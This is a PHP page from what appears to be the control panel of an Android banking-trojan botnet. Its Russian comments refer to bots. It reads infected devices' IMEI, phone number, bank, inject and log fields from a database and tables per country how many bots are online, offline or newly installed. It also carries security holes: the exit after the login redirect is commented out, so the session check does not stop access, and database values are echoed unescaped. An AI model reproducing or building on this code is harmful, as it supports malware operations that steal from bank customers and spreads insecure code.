<?php

if (!(isset($_SESSION['Name'])))
{
	//идем на страницу авторизации
	header("Location: /login.php");
//	exit;
}


include 'config.php';
$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
$connection->exec('SET NAMES utf8');
$sql = "SELECT * FROM kliets";



//Страна/Количество/Онлайн/Оффлайн/Офлайн более 2х дней/Установлено за сегодня/Installs/Убито/
$Country[]="";
for($ii=0;$ii<5000;$ii++)
{
$kol[$ii] = 0;
$kol_on[$ii] = 0;
$kol_off[$ii] = 0;
$kol_off2x[$ii] = 0;
$setup[$ii] = 0;
$installs[$ii] = 0;
$kills[$ii] = 0;
}

$all_kol = 0;
$all_kol_on = 0;
$all_kol_off = 0;
$all_kol_off2x = 0;
$all_setup = 0;
$all_installs = 0;
$all_kills = 0;

$indexSQL=0;
foreach($connection->query($sql) as $row){
	$country = $row['country'];
		if($indexSQL==0) 
			{
				$Country[]=$country;
				$indexSQL++;
			}else{
				$goCountry = false;
				for ($i = 0; $i <= count($Country)-1; $i++){
					if($country == $Country[$i]){
						$goCountry = true;
						break;
					}
				} 
				if($goCountry == false){
					$Country[]=$country;
				}
			}
}

foreach($connection->query($sql) as $row)
		{
			
			$ID = $row['id'];
			$IMEI = $row['IMEI'];
			$number = $row['number'];
			$version = $row['version'];
			$country = $row['country'];
			$bank = $row['bank']; 
			$model = $row['model'];
			$lastConnect = $row['lastConnect'];
			$firstConnect = $row['firstConnect'];
			$l_inj=$row['inj'];
			$l_bank=$row['l_bank'];
			$l_log=$row['log'];
			$color=$row['color'];
			$all_kol++;
				for ($i = 0; $i <= count($Country)-1; $i++){
					if($country == $Country[$i]){
						$kol[$i]++;
						break;
					}
				} 
			
			//******Получаем иконку состояния бота, вычисляем дату****
			$arr_data_from = explode(" ", $row['lastConnect']);
			$arr_data_till = explode(" ", date('Y-m-d H:i')); 
				
			$date_from = $arr_data_from[0];
			$date_till = $arr_data_till[0]; 
			
			$date_from = explode('-', $date_from);
			$date_till = explode('-', $date_till);
	 
			$time_from = mktime(0, 0, 0, $date_from[1], $date_from[2], $date_from[0]);
			$time_till = mktime(0, 0, 0, $date_till[1], $date_till[2], $date_till[0]);
			
			$day = ($time_till - $time_from)/60/60/24; //получаем разницу кол-во дней!
			//----------Секунды!-------/
			$date1 = new \DateTime($row['lastConnect']);
			$date2 = new \DateTime(date('Y-m-d H:i'));
			$diff = $date2->diff($date1);
			// разница в секундах
			$seconds = ($diff->y * 365 * 24 * 60 * 60) + //получаем разницу в секундах!
			($diff->m * 30 * 24 * 60 * 60) +
			($diff->d * 24 * 60 * 60) +
			($diff->h * 60 * 60) +
			($diff->i * 60) +
			$diff->s;
			//----------обработка состояние иконки on/off-------/
			if($day>=2)//Дни!
			{

				$all_kol_off++;
				$all_kol_off2x++;

				
				for ($i = 0; $i <= count($Country)-1; $i++){
						if($country == $Country[$i]){
							$kol_off2x[$i]++;
							$kol_off[$i]++;
							break;
						}
					} 
			}
			else
			{
				if($seconds<=120)
				{
					$all_kol_on++;
					for ($i = 0; $i <= count($Country)-1; $i++){
						if($country == $Country[$i]){
							$kol_on[$i]++;
							break;
						}
					} 
				}
				else
				{
					$kol_offline++;
					$all_kol_off++;

					for ($i = 0; $i <= count($Country)-1; $i++){
						if($country == $Country[$i]){
							$kol_off[$i]++;
							break;
						}
					} 
				}
			}

			//************Установок за сегондя********************************************
			
			$arr_data_from2 = explode(" ", $row['firstConnect']);
			$arr_data_till2 = explode(" ", date('Y-m-d H:i')); 
				
			$date_from2 = $arr_data_from2[0];
			$date_till2 = $arr_data_till2[0]; 
			
			$date_from2 = explode('-', $date_from2);
			$date_till2 = explode('-', $date_till2);
	 
			$time_from2 = mktime(0, 0, 0, $date_from2[1], $date_from2[2], $date_from2[0]);
			$time_till2 = mktime(0, 0, 0, $date_till2[1], $date_till2[2], $date_till2[0]);
			
			$day2 = ($time_till2 - $time_from2)/60/60/24; //получаем разницу кол-во дней!
			
			if($day2 == 0)//считаем количество установок за сегодня
			{
				$all_setup++;
				for ($i = 0; $i <= count($Country)-1; $i++){
					if($country == $Country[$i]){
						$setup[$i]++;
						break;
					}
				} 
			}
			if($day2 <= 7)//считаем количество установок за неделю
			{
				$install_week++;
			}
		}
?>


<div class="content" style="padding-top:15px; font-size:20px">
<table align="center" class="header_table_commands table_dark" border="1" cellspacing="0" cellpadding="0" width=100%>
	<thead class="header_table_commands">	
		<th>Страна</th>
		<th>Количество</th>	
		<th>Онлайн</th>
		<th>Оффлайн</th>
		<th>Оффлайн более 2х дней</th>
		<th>Установлено за сегодня</th>	
	</thead>
	
<?php

echo "<p id='text_command'>СТАТИСТИКА</p>";

for ($i = 0; $i<=count($Country)-1; $i++){
	if($Country[$i]!=""||$Country[$i]!=null)
	{
		echo "<tr class='table_bots' style='color: #A4A4A4'>
			<td>
			<a title='$Country[$i]'><img src='/images/country/$Country[$i].png' width='20px'/></a>
			</td>
			<td>$kol[$i]</td>
			<td>$kol_on[$i]</td>
			<td>$kol_off[$i]</td>
			<td>$kol_off2x[$i]</td>
			<td>$setup[$i]</td>
			</tr>";
	}	
}

echo "<tr class='table_bots' style='color: #A4A4A4'>
			<td>
			<a>Всего</a>
			</td>
			<td>$all_kol</td>
			<td>$all_kol_on</td>
			<td>$all_kol_off</td>
			<td>$all_kol_off2x</td>
			<td>$all_setup</td>
			</tr>";
?>

</div>